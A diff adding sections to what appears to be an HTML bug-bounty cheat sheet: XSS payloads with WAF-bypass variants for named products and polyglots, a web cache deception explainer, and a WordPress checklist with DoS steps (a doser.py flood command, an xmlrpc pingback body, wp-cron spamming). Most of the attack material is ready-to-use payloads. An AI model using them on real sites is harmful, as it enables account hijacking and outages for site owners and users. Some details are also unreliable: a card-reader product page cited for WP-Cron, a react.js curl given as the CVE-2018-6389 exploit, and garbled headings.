@@ -131,6 +131,21 @@
             border-radius: 5px;
             overflow-x: auto;
         }
+         .category-content {
+            padding: 20px;
+            border: 1px solid #ccc;
+            margin-bottom: 20px;
+        }
+        .category-content h2 {
+            color: #333;
+        }
+        .category-content a {
+            color: #1a73e8;
+            text-decoration: none;
+        }
+        .category-content a:hover {
+            text-decoration: underline;
+        }
     </style>
 </head>
 <body>
@@ -950,6 +965,444 @@ https://theirsite.com.mysite.com
                 </div>
             </div>
         </div>
+        
+         <!-- XSS Payloads Category -->
+        <div class="category">
+            <h3><input type="checkbox" id="xss-payloads">11 > XSS Payloads</h3>
+            <div class="subcategory">
+                <h4>1. If you cannot escape from the attribute (" is being encoded or deleted)</h4>
+                <pre><code>
+1) &lt;a href="javascript:alert(1)"&gt;Click&lt;/a&gt;
+
+2) &lt;a href="&#01;javascript:alert(1)"&gt;Click&lt;/a&gt;
+
+3) &lt;a href="javascript:{ alert\`0\` }"&gt;Click&lt;/a&gt;
+
+4) &lt;a src="google.com" onclick="alert(1)"&gt;Click&lt;/a&gt;
+                </code></pre>
+                <p>Or try to replace " with \u0022, > with \u003e and < with \u003c. So the payload will be:</p>
+                <pre><code>
+4) \u0022\u003e\u003cimg src=x onerror=alert(1)\u003e\u003cx y=\u0022
+                </code></pre>
+
+                <h4>2. If you can escape from the attribute but not from the tag (> is encoded or deleted)</h4>
+                <pre><code>
+1) &lt;input   value"XXXXXXX"   onclick=alert(1)  &gt;Click&lt;/input&gt;
+
+2) &lt;input  type:"text" value="XSS"  accesskey="x" onclick="alert(1)" &gt;
+
+3) &lt;img src=x  onerror="&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041"&gt;
+
+4) &lt;/div&gt;&lt;a  src="google.com"  href="javaSCRIPT&colon;alert(/xss/)"&gt;XSS&lt;/a&gt;
+
+5) &lt;a  href=https://google.com onclick=alert(document.location.hash.substring(1))#{saasasasas}&gt;Click&lt;/a&gt;
+                </code></pre>
+                <p>Or use encodes:</p>
+                <pre><code>
+Use Unicodes - UTF8 - UTF16 - UTF32
+%3cscript%3e
+%253cscript%253e
+&lt;script&gt;
+
+%u003Csvg onload=alert(1)&gt;
+%u3008svg onload=alert(2)&gt;
+%uFF1Csvg onload=alert(3)&gt;
+
+Burp Suite &gt; Convert Selection &gt; HTML &gt; HTML-encode all character
+&lt;a href="javascript:alert(1)"&gt;Click&lt;/a&gt; =
+&lt;&#97;&#32;&#104;&#114;&#101;&#102;&#61;&quot;&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;&quot;&gt;&#67;&#108;&#105;&#99;&#107;&lt;&#47;&#97;&gt;
+                </code></pre>
+
+                <h4>3. If alert is encoded or deleted</h4>
+                <pre><code>
+1) &lt;script&gt;$='',_=!$+$,$$=!_+$,$_=$+{},_$=_[$++],__=_[_$$=$],_$_=++_$$+$,$$$=$_[_$$+_$_],_[$$$+=$_[$]+(_.$$+$_)[$]+$$[_$_]+_$+__+_[_$$]+$$$+_$+$_[$]+__][$$$]($$[$]+$$[_$$]+_[_$_]+__+_$+"($)")()&lt;/script&gt;
+
+2) &lt;script&gt;[[,$,_,$$,__,$_,_$,$$$,$__,,___]=[![]+[]+!![]][+[]]+[][[]]],$$_=[][$+$_],[,,,$_$,,,_$$,,,,,__$,_$_]=[...$$_+[]],$_$+_$$+___+$$+$_+_$+$$$+$_$+$_+_$$+_$$$_[$_$+_$$+___+$$+$_+_$+$$$+$_$+$_+_$$+_$]($+_+__+_$+$_+__$+[+!!$]+_$_)()&lt;/script&gt;
+
+3) &lt;script&gt;([,O,B,J,E,C,,]=[]+{},[T,R,U,E,F,A,L,S,,,N]=[!!O]+!O+B.E)[X=C+O+N+S+T+R+U+C+T+O+R][X](A+L+E+R+T+`(1)`)()&lt;/script&gt;
+   
+4) &lt;html&gt;
+   &lt;body&gt;
+   &lt;head&gt;
+   &lt;meta charset="utf-8"&gt;   
+   &lt;/head&gt; 
+   &lt;script&gt;
+   ᐁ='',ᐃ=!ᐁ+ᐁ,ᐅ=!ᐃ+ᐁ
+   ᐊ=ᐁ+{},ᐄ=ᐃ[ᐁ++],ᐆ=
+   ᐃ[ᐋ=ᐁ],ᐒ=++ᐋ+ᐁ,ᐗ
+   =ᐊ[ᐋ+ᐒ],ᐃ[ᐗ+=ᐊ[ᐁ]
+   +(ᐃ.ᐅ+ᐊ)[ᐁ]+ᐅ[ᐒ]+ᐄ
+   +ᐆ+ᐃ[ᐋ]+ᐗ+ᐄ+ᐊ[ᐁ]
+   +ᐆ][ᐗ](ᐅ[ᐁ]+ᐅ[ᐋ]+ᐃ
+   [ᐒ]+ᐆ+ᐄ+"`ᐁᐃ`")()
+   &lt;/script&gt;
+   &lt;/html&gt;
+   &lt;/body&gt;
+
+5) &lt;script&gt;prompt(1)&lt;/script&gt;
+
+6) &lt;a"/onclick=(confirm)()&gt;Click Here!
+
+7) &lt;script&gt;/&amp;-alert(1)&lt;/script&gt;
+&lt;script&gt;/&amp;amp;-alert(1)&lt;/script&gt;
+
+8) %00%00%00%00%00%00%00&lt;script&gt;alert(1)&lt;/script&gt;     (1.Null bytes are output   2.There is no space character immediately before)
+
+9) &lt;sVg OnPointerEnter="location=`javas`+`cript:ale`+`rt%2`+`81%2`+`9`"&gt;
+
+10) &lt;bleh/onclick=top[/al/.source+/ert/.source]&Tab;``&gt;click 
+
+11) &lt;script&gt;alert.call(null,1)&lt;/script&gt;   (alert.call(%20, "XSS");)
+
+12) &lt;script&gt;confirm.call(null,1)&lt;/script&gt;
+
+13) &lt;script&gt;prompt.call(null,1)&lt;/script&gt;
+
+14) &lt;script&gt;alert.apply(null, [1])&lt;/script&gt;
+
+15) &lt;iframe src=//14.rs&gt;
+
+16) &lt;form&gt;&lt;button formaction=http://14.rs&gt;Hacked&lt;/form&gt;
+                </code></pre>
+
+                <h4>4. If space is encoded or deleted</h4>
+                <pre><code>
+Use tab url encode : %09
+&lt;input%09value"XXXXXXX"%09onclick=alert(1)&gt;Click&lt;/input&gt;
+                </code></pre>
+
+                <h4>5. If () is encoded or deleted</h4>
+                <pre><code>
+&lt;script&gt;alert`1`&lt;/script&gt;
+                </code></pre>
+
+                <h4>6. If &lt;script&gt; is encoded or deleted try other tags like:</h4>
+                <pre><code>
+SVG, img, iframe 
+                </code></pre>
+                
+                <h4>7. Some WAF bypass:</h4>
+                <pre><code>
+@vanshitmalhotra | Bypass AWS WAF -// 
+Add "&lt;!" (without quotes) before your payload and bypass that WAF. :)
+eg: &lt;!&lt;script&gt;confirm(1)&lt;/script&gt;
+
+@black0x00mamba | Bypass WAF Akamaighost & filtered onload, onclick, href, src, onerror, script, etc 
+&lt;img  sr%00c=x o%00nerror=((pro%00mpt(1)))&gt;
+
+DotDefender WAF bypass by @0xInfection 
+&lt;bleh/ondragstart=&Tab;parent&Tab;['open']&Tab;&lpar;&rpar;%20draggable=True&gt;dragme
+
+@LooseSecurity | Updated CloudFlare bypass (bypasses virtually all WAF you'll encounter in the wild):
+&lt;iframe/src='%0Aj%0Aa%0Av%0Aa%0As%0Ac%0Ar%0Ai%0Ap%0At%0A:prompt`1`'&gt;
+Javascript URI cushioned between carriage returns with a non-bracketed prompt.
+
+@daveysec | Was able to bypass Imperva Incapsula WAF with:
+&lt;svg onload\r\n=$.globalEval("al"+"ert()");&gt;
+
+@rodolfoassis | Wordfence 7.4.2
+&lt;a href=&#01javascript:alert(1)&gt;
+
+rodolfoassis | Sucuri CloudProxy (POST only)
+&lt;a href=javascript&colon;confirm(1)&gt;
+
+rodolfoassis | ModSecurity CRS 3.2.0 PL1
+&lt;a href="jav%0Dascript&colon;alert(1)"&gt;
+   
+@brutelogic | Cloudflare
+&lt;Svg Only=1 OnLoad=alert(1)&gt;
+   
+&lt;script&gt;{onerror=alert}throw 1&lt;/script&gt; -->
+
+&lt;script&gt;eval.call`${'alert\x2823\x29'}`&lt;/script&gt;
+
+&lt;img src=x onerror=this.innerHTML=String.fromCharCode(60,105,109,103,32,115,114,99,61,39,120,39,32,111,110,101,114,114,111,114,61,39,97,108,101,114,116,40,100,111,99,117,109,101,110,116,46,100,111,109,97,105,110,41,59,39,62)
+                </code></pre>
+
+                <h4>8. Some good stuff:</h4>
+                <pre><code>
+https://github.com/Walidhossain010/WAF-bypass-xss-payloads
+https://aswingovind.medium.com/content-spoofing-yes-html-injection-39611d9a4057
+                </code></pre>
+
+                <h4>9. XSS PolyglotsPolice: revolving allow you to test multiple XSS scenarios with ONE payload. Work smarter not harder:</h4>
+                <img src="https://user-images.githubusercontent.com/63053441/148800150-58f87374-41ad-4ea8-8887-510c652c7452.jpg" alt="XSS PolyglotsPolice">
+                <pre><code>
+-->'"/&gt;&lt;/sCript&gt;&lt;deTailS open x="&gt;" ontoggle=(co\u006efirm)``&gt;
+jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//&lt;/stYle/&lt;/titLe/&lt;/teXtarEa/&lt;/scRipt/&gt;--!&gt;\x3csVg/&lt;sVg/oNloAd=alert()//&gt;
+                </code></pre>
+            </div>
+        </div>
+        
+        
+        <!-- Web Cache Deception Category -->
+        <div class="category">
+            <h3><input type="checkbox" id="web-cache-deception">12 > Web Cache Deception</h3>
+            <div class="subcategory">
+                <h4>Summary</h4>
+                <p>Web Cache Deception (WCD) is an attack in which an attacker deceives a caching proxy into improperly storing private information sent over the internet and gaining unauthorized access to that cached data. It was proposed by Omer Gil, a security researcher in 2017.</p>
+                
+                <h4>How does web cache deception attack work?</h4>
+                <p>When the browser makes a request to a website, the connection usually passes through the CDNs (Content Delivery Network).</p>
+                <p>CDNs are a geographically distributed network of proxy servers and their data centers, which caches the local copies of web content to provide faster access to the users by reducing their network latency, and thus reducing the load on web servers.</p>
+                <p>Caching servers have no safeguards to authenticate users and prevent information, and it only stores non-user specific static or public content. And all the user-specific dynamic contents get routed to the main servers of the website or service a user interacts with.</p>
+                <p>The web caching deception (WCD) attack works by the technique of path confusion attack.</p>
+                <p>It manipulates the URL path by which the cache server is forced to store, and the sensitive data gets revealed as public content.</p>
+
+                <p align="center">
+                    <img src="https://github.com/cyspad/my-share-image-repo/blob/88b8e4be9bfed88a2f2b542a97970619735b02eb/wcd-background.png?raw=true">
+                </p>
+
+                <h4>Simple Manual Testing</h4>
+                <pre>
+1) First check caching with non-existent static files in paths (https://target.tld/profile/payments/nonexistent.css)
+2) If the response is not 404 and payments information is still displayed, the attack scenario is applicable
+                </pre>
+
+                <h4>How to test Web Cache Deception with BurpSuite</h4>
+                <pre>
+1) Install Web Cache Deception Scanner Extension in Burp Suite
+2) Select Target (Target Tab in Burp Suite)
+3) Right Click --> Extensions --> Web Cache Deception Scanner -> Web Cache Deception Test
+                </pre>
+                
+                <p align="center">
+                    <img src="https://github.com/cyspad/my-share-image-repo/blob/04ab3d0d2e241ca48c44d9d650fec25686b7a9e9/Web-Cache-Deception%20Scanner.jpg?raw=true">
+                </p>
+
+                <p>Happy Hunting ;)</p>
+            </div>
+        </div>
+        
+        <!-- WordPress Common Misconfiguration Category -->
+<div class="category">
+    <h3><input type="checkbox" id="wordpress-common-misconfiguration">13 > WordPress Common Misconfiguration</h3>
+    <div class="subcategory">
+        <h4>Here I will try my best to mention all common security misconfigurations for WordPress I saw before or officially referenced. I will be attaching all PoC and references as well.</h4>
+
+        <h4>Index</h4>
+        <ul>
+            <li><a href="https://github.com/0xmaximus/Galaxy-Bugbounty-Checklist/blob/main/WordPress/README.md#wordpress-detection">WordPress Detection</a></li>
+            <li><a href="https://github.com/0xmaximus/Galaxy-Bugbounty-Checklist/blob/main/WordPress/README.md#geneal-scan-tool">General Scan Tool</a></li>
+            <li><a href="https://github.com/0xmaximus/Galaxy-Bugbounty-Checklist/blob/main/WordPress/README.md#admin-panel">Admin Panel</a></li>
+            <li><a href="https://github.com/0xmaximus/Galaxy-Bugbounty-Checklist/blob/main/WordPress/README.md#cve-2018-6389">CVE-2018-6389</a></li>
+            <li><a href="https://github.com/0xmaximus/Galaxy-Bugbounty-Checklist/blob/main/WordPress/README.md#xmlrpcphp">xmlrpc.php</a></li>
+            <li><a href="https://github.com/0xmaximus/Galaxy-Bugbounty-Checklist/blob/main/WordPress/README.md#denial-of-service-via-cronjob">Denial of Service via Cronjob</a></li>
+            <li><a href="https://github.com/0xmaximus/Galaxy-Bugbounty-Checklist/blob/main/WordPress/README.md#denial-of-service-via-load-scriptsphp-cve-2018-6389">Denial of Service via load-scripts.php (CVE-2018-6389)</a></li>
+            <li><a href="https://github.com/0xmaximus/Galaxy-Bugbounty-Checklist/blob/main/WordPress/README.md#wp-user-enumeration">WP User Enumeration</a></li>
+            <li><a href="https://github.com/0xmaximus/Galaxy-Bugbounty-Checklist/blob/main/WordPress/README.md#sensitive-files-exposed">Sensitive files exposed</a></li>
+            <li><a href="https://github.com/0xmaximus/Galaxy-Bugbounty-Checklist/blob/main/WordPress/README.md#bypass-403">Bypass 403</a></li>
+            <li><a href="https://github.com/0xmaximus/Galaxy-Bugbounty-Checklist/blob/main/WordPress/README.md#enumerating-plugins">Enumerating plugins</a></li>
+            <li><a href="https://github.com/0xmaximus/Galaxy-Bugbounty-Checklist/edit/main/WordPress/README.md#find-origin-ip-in-wordpress">Find WordPress Origin IP</a></li>
+        </ul>
+
+        <h4>WordPress Detection</h4>
+        <p>Well, if you are reading this you already know about technology detection tools and methods. Still adding them below:</p>
+        <ul>
+            <li>Wappalyzer</li>
+            <li>WhatRuns</li>
+            <li>BuildWith</li>
+        </ul>
+
+        <h4>General Scan Tool</h4>
+        <ul>
+            <li><a href="https://github.com/wpscanteam/wpscan">WpScan</a></li>
+            <li><a href="https://github.com/blackcrw/wprecon">WPrecon</a></li>
+            <li><a href="https://github.com/oways/cms-checker">cms-checker</a></li>
+            <li><a href="https://wpsec.com">https://wpsec.com</a></li>
+            <li><a href="https://www.infosecmatter.com/cms-vulnerability-scanners-for-wordpress-joomla-drupal-moodle-typo3/">For more see this</a></li>
+        </ul>
+
+        <h4>Admin Panel</h4>
+        <p>If you find an admin login panel, you must report it in pentest. On a typical WordPress install, all you need to do is add /login/ or /admin/ to the end of your site URL.</p>
+        <p>For example:</p>
+        <ul>
+            <li>www.example.com/admin/</li>
+            <li>www.example.com/login/</li>
+        </ul>
+        <p>If for some reason, your WordPress login URL is not working properly, then you can easily access the WordPress login page by going to this URL:</p>
+        <ul>
+            <li>www.example.com/wp-login.php</li>
+            <li>www.example.com/admin/</li>
+            <li>www.example.com/wp-admin/</li>
+        </ul>
+        <h5>Bypass</h5>
+        <ul>
+            <li>If you can't find the admin panel, just go to /wp-admin/install.php and you'll find out where the login page has moved!</li>
+            <li>If you got 403, try methods that will be explained in "<a href="https://github.com/0xmaximus/Galaxy-Bugbounty-Checklist/blob/main/WordPress/README.md#bypass-403">Bypass 403 pages</a>".</li>
+        </ul>
+
+        <h4>CVE-2018-6389</h4>
+        <p>This issue can bring down any WordPress site under 4.9.3. So, while reporting, make sure that your target website is running WordPress under 4.9.3.</p>
+        <h5>Detection</h5>
+        <p>Use the URL from my gist called loadsxploit; you will get massive JS data in response.</p>
+        <ul>
+            <li><a href="https://gist.github.com/remonsec/4877e9ee2b045aae96be7e2653c41df9">loadsxploit</a></li>
+        </ul>
+        <h5>Exploit</h5>
+        <p>You can use any DoS tool. I found Doser to be really fast, and it shuts down the webserver within 30 seconds.</p>
+        <ul>
+            <li><a href="https://github.com/quitten/doser.py">Doser</a></li>
+        </ul>
+        <pre>
+            python3 doser.py -t 999 -g 'https://site.com/fullUrlFromLoadsxploit'
+        </pre>
+        <h5>References</h5>
+        <ul>
+            <li><a href="https://hackerone.com/reports/752010">H1 Report</a></li>
+            <li><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-6389">CVE Details</a></li>
+            <li><a href="https://baraktawily.blogspot.com/2018/02/how-to-dos-29-of-world-wide-websites.html">Blog Post</a></li>
+        </ul>
+
+        <h4>xmlrpc.php</h4>
+        <p>This is one of the common issues with WordPress. To get some bucks with this misconfiguration, you must fully exploit it and show the impact properly.</p>
+        <p>XML-RPC is a remote procedure call (RPC) protocol which uses XML to encode its calls and HTTP as a transport mechanism. “XML-RPC” also refers generically to the use of XML for remote procedure calls, independently of the specific protocol. Basically, it's a file that can be used for pulling POST data from a website through Remote Procedure Call.</p>
+        <p>In WordPress, it’s an API that allows developers to perform operations on the WordPress site, such as publishing a post, editing a post, deleting a post, and even uploading some files.</p>
+        <h5>Detection</h5>
+        <ul>
+            <li>Visit site.com/xmlrpc.php</li>
+            <li>Get the error message about POST requests only</li>
+        </ul>
+        <h5>Exploit</h5>
+        <ul>
+            <li>Intercept the request and change the method GET to POST</li>
+            <li>List all Methods
+                <pre>
+                &lt;methodCall&gt;
+                &lt;methodName&gt;system.listMethods&lt;/methodName&gt;
+                &lt;params&gt;&lt;/params&gt;
+                &lt;/methodCall&gt;
+                </pre>
+            </li>
+            <li>Check if the `pingback.ping` method is there or not</li>
+            <li>Perform DDOS
+                <pre>
+                &lt;methodCall&gt;
+                &lt;methodName&gt;pingback.ping&lt;/methodName&gt;
+                &lt;params&gt;
+                &lt;param&gt;
+                &lt;value&gt;http://attacker.com&lt;/value&gt;
+                &lt;/param&gt;
+                &lt;param&gt;
+                &lt;value&gt;http://victim.com&lt;/value&gt;
+                &lt;/param&gt;
+                &lt;/params&gt;
+                &lt;/methodCall&gt;
+                </pre>
+            </li>
+        </ul>
+        <h5>References</h5>
+        <ul>
+            <li><a href="https://www.owasp.org/index.php/XML_External_Entity_(XXE)_Processing">XML External Entity Processing</a></li>
+            <li><a href="https://thehackernews.com/2019/12/xmlrpc-dos-wordpress.html">XML-RPC DoS Attack</a></li>
+        </ul>
+
+        <h4>Denial of Service via Cronjob</h4>
+        <p>WordPress has an inbuilt cron job mechanism called WP-Cron, which runs automatically at scheduled intervals. This mechanism can be exploited to cause Denial of Service (DoS).</p>
+        <h5>Exploit</h5>
+        <p>Look for patterns that allow you to post requests continuously. One way to exploit is to spam the cron jobs in your target website.</p>
+        <pre>
+        curl -X POST -d 'testdata' http://site.com/wp-cron.php
+        </pre>
+        <h5>References</h5>
+        <ul>
+            <li><a href="https://www.acs.com.hk/en/products/275/acr1281u-c1/">DoS via WP-Cron</a></li>
+        </ul>
+
+        <h4>Denial of Service via load-scripts.php (CVE-2018-6389)</h4>
+        <p>This CVE is a critical issue found in WordPress. You should use the technique mentioned in CVE-2018-6389 to cause a DoS.</p>
+        <h5>Exploit</h5>
+        <pre>
+        curl -X GET "http://site.com/wp-includes/js/dist/vendor/react.js"
+        </pre>
+        <h5>References</h5>
+        <ul>
+            <li><a href="https://www.exploit-db.com/exploits/45473">Exploit DB</a></li>
+            <li><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-6389">CVE Details</a></li>
+        </ul>
+
+        <h4>WP User Enumeration</h4>
+        <p>WordPress provides various ways to enumerate users:</p>
+        <ul>
+            <li>http://example.com/?author=1 (change 1 to 2, 3, etc.)</li>
+            <li>http://example.com/wp-json/wp/v2/users (if REST API is enabled)</li>
+        </ul>
+        <h5>References</h5>
+        <ul>
+            <li><a href="https://www.owasp.org/index.php/User_Enumeration">OWASP User Enumeration</a></li>
+            <li><a href="https://securitytrails.com/blog/wp-user-enumeration">Security Trails</a></li>
+        </ul>
+
+        <h4>Sensitive Files Exposed</h4>
+        <p>Ensure sensitive files are not exposed:</p>
+        <ul>
+            <li>http://example.com/wp-config.php</li>
+            <li>http://example.com/.htaccess</li>
+        </ul>
+        <h5>References</h5>
+        <ul>
+            <li><a href="https://www.cvedetails.com/cve/CVE-2021-24287/">Sensitive File Exposure</a></li>
+        </ul>
+
+        <h4>Bypass 403</h4>
+        <p>If you are encountering 403 Forbidden errors, try different methods such as:</p>
+        <ul>
+            <li>Check if URL is correct</li>
+            <li>Use different HTTP methods</li>
+            <li>Check for IP whitelisting issues</li>
+        </ul>
+        <h5>References</h5>
+        <ul>
+            <li><a href="https://www.owasp.org/index.php/403_Forbidden">OWASP 403 Forbidden</a></li>
+        </ul>
+
+        <h4>Enumerating Plugins</h4>
+        <p>Use tools to enumerate WordPress plugins:</p>
+        <ul>
+            <li><a href="https://wpscan.com/">WPScan</a></li>
+            <li><a href="https://github.com/wpscanteam/wpscan">WPScan GitHub</a></li>
+        </ul>
+        <h5>References</h5>
+        <ul>
+            <li><a href="https://www.hacker101.com/tools/wp-enum">WP Enum Tool</a></li>
+        </ul>
+
+        <h4>Find WordPress Origin IP</h4>
+        <p>In some cases, you might want to find the origin IP of the WordPress server:</p>
+        <ul>
+            <li>Look for clues in headers</li>
+            <li>Use network reconnaissance tools</li>
+        </ul>
+        <h4>References</h4>
+        
+        Twitters:</br>
+@jae_hak99
+@minometidji
+@sw33tLie
+@Jester0x01
+@daffainfo
+@SalimAlk15
+@xalerafera
+@gopalsamy_ru
+@16yashpatel
+@fuxsocy_py
+@EkinBayer4
+@3XS0
+@CyberWarship
+@vxer0dayz</br>
+
+
+
+        <ul>
+        	<li><a href="https://github.com/daffainfo/AllAboutBugBounty">AllAboutBugBounty</a></li>
+       		 <li><a href="https://github.com/KathanP19/HowToHunt">HowToHunt</a></li>
+       		 <li><a href="https://malavsharma.medium.com/wordpress-xmlrpc-php-my-first-resolved-report-bee438f35ad8">XMLRPC</a></li>
+        	    <li><a href="https://www.owasp.org/index.php/HTTP_Headers">OWASP HTTP Headers</a></li>
+        </ul>
+    </div>
+</div>
+
+        
     </main>
 </body>
 </html>
